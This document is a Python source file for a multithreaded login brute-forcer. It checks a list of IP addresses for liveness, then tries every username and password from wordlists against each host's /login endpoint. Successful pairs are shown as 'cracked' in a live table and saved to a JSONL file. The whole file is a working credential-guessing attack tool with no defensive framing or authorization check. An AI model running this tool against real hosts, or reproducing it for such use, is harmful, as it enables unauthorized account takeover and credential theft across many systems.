import time
import json
import typer
import threading
import concurrent.futures
from functions import *  # read_file, is_ip_up, make_request_with_retries, save_cracked

from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from rich.live import Live
from rich.progress import (
    Progress,
    SpinnerColumn,
    BarColumn,
    MofNCompleteColumn,
    TextColumn,
    TimeElapsedColumn,
    TimeRemainingColumn,
)

console = Console()
app = typer.Typer()


class Crack:
    def __init__(self):
        self.lock = threading.Lock()
        self.cracked = []

    def _make_cracked_table(self):
        table = Table(title="Cracked Results", box=None, expand=True)
        table.add_column("IP", style="green", no_wrap=True)
        table.add_column("Username", style="magenta")
        table.add_column("Password", style="yellow")
        table.add_column("Time", style="dim", no_wrap=True)
        return table

    def _append_cracked_to_disk(self, path_cracked: str, entry: dict):
        """
        Append a single cracked entry to disk in JSONL format.
        This is thread-safe if called while holding self.lock.
        """
        # Ensure directory exists? (optional)
        try:
            with open(path_cracked, "a", encoding="utf-8") as f:
                f.write(json.dumps(entry, ensure_ascii=False) + "\n")
        except Exception as e:
            # If disk write fails, at least log to console
            console.print(f"[red]Failed to save cracked entry to disk:[/] {e}")

    def crack(
        self,
        path_ip_list: str,
        path_userlist: str,
        path_passwordlist: str,
        path_cracked: str,
        thread: int,
    ):
        ip_list = read_file(path_ip_list)
        usernamelist = read_file(path_userlist)
        passwordlist = read_file(path_passwordlist)
        self.cracked = []
        ip_up = []

        console.rule("[bold cyan]Start Check IPs")

        # Phase 1: Check IPs (simple progress, transient so it disappears)
        with Progress(
            SpinnerColumn(),
            TextColumn("[bold blue]Checking IPs"),
            BarColumn(bar_width=None),
            MofNCompleteColumn(),
            TimeElapsedColumn(),
            TimeRemainingColumn(),
            console=console,
            transient=True,
        ) as progress:
            is_up_task = progress.add_task("check_ips", total=len(ip_list))
            with concurrent.futures.ThreadPoolExecutor(max_workers=thread) as executor:
                futures = [executor.submit(is_ip_up, ip) for ip in ip_list]
                for future in concurrent.futures.as_completed(futures):
                    result = future.result()
                    progress.update(is_up_task, advance=1)
                    if result[0]:
                        ip_up.append(result[1])

        console.rule("[bold cyan]Start Cracking")

        cracked_table = self._make_cracked_table()

        def add_cracked_row_and_persist(ip, username, password):
            """
            Thread-safe: update in-memory list, update live table and append to disk file immediately.
            """
            ts = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
            entry = {"ip": ip, "username": username, "password": password, "time": ts}
            with self.lock:
                # update in-memory list
                self.cracked.append(entry)
                # append to disk immediately (JSONL)
                self._append_cracked_to_disk(path_cracked, entry)
                # rebuild table to show in Live
                new_table = self._make_cracked_table()
                for e in self.cracked:
                    new_table.add_row(e["ip"], e["username"], e["password"], e["time"])
            return new_table

        def process_ip(ip, progress, live_panel_updater):
            for username in usernamelist:
                progress.update(username_task, description=f"[magenta]User: {username}")
                for password in passwordlist:
                    progress.update(password_task, description=f"[yellow]Pass: {password}")
                    try:
                        data = {"username": username, "password": password}
                        response = make_request_with_retries(url=f"{ip}/login", data=data)

                        if response.status_code == 404:
                            console.print(f"[yellow]404 Not Found:[/] {ip}")
                            return ip

                        try:
                            json_data = response.json()
                        except json.JSONDecodeError:
                            console.print(f"[yellow]Invalid JSON:[/] {ip}")
                            return ip

                        if json_data.get("success"):
                            # Save immediately + get updated table
                            table = add_cracked_row_and_persist(ip, username, password)
                            console.log(f"[green]Cracked[/] {ip} → {username}:{password}")
                            # update Live panel (thread-safe because add_cracked_row_and_persist used lock)
                            live_panel_updater(table)
                            return ip
                    except Exception as e:
                        console.print(f"[red]Request error for {ip}:[/] {e}")
                        return ip
                    finally:
                        progress.update(password_task, advance=1)
                progress.update(username_task, advance=1)
            return ip

        # If file exists and you want to start with existing entries, you can optionally load them here.
        # For safety, open and touch the file so append works consistently:
        try:
            open(path_cracked, "a", encoding="utf-8").close()
        except Exception:
            pass

        # Phase 2: Cracking with Live panel and immediate persistence
        with Progress(
            SpinnerColumn(),
            TextColumn("[progress.description]{task.description}"),
            BarColumn(bar_width=None),
            MofNCompleteColumn(),
            TimeElapsedColumn(),
            TimeRemainingColumn(),
            expand=True,
        ) as progress, Live(
            Panel(cracked_table, title="Cracked (Live)"),
            refresh_per_second=6,
            transient=False,
        ) as live:
            # helper to update live panel safely from threads
            def live_panel_updater(table_obj):
                # live.update is thread-safe in rich, but we keep lock around rebuild in add function
                live.update(Panel(table_obj, title=f"Cracked ({len(self.cracked)})"))

            ip_task = progress.add_task("[green]IPs", total=len(ip_up))
            username_task = progress.add_task("[magenta]Usernames", total=len(usernamelist))
            password_task = progress.add_task("[yellow]Passwords", total=len(passwordlist))

            with concurrent.futures.ThreadPoolExecutor(max_workers=thread) as executor:
                futures = [executor.submit(process_ip, ip, progress, live_panel_updater) for ip in ip_up]
                for future in concurrent.futures.as_completed(futures):
                    progress.update(ip_task, advance=1)

        console.rule("[bold green]Done")

        if self.cracked:
            console.print(Panel(f"[bold green]Cracked {len(self.cracked)} entries[/]\nSaved to: {path_cracked}"))
        else:
            console.print(Panel("[yellow]No credentials cracked.[/]"))

        # If you still want to call an external save_cracked that expects a list, you can:
        try:
            save_cracked(self.cracked, path_cracked)
        except Exception:
            # ignore or log; primary persistence already done in JSONL append
            pass
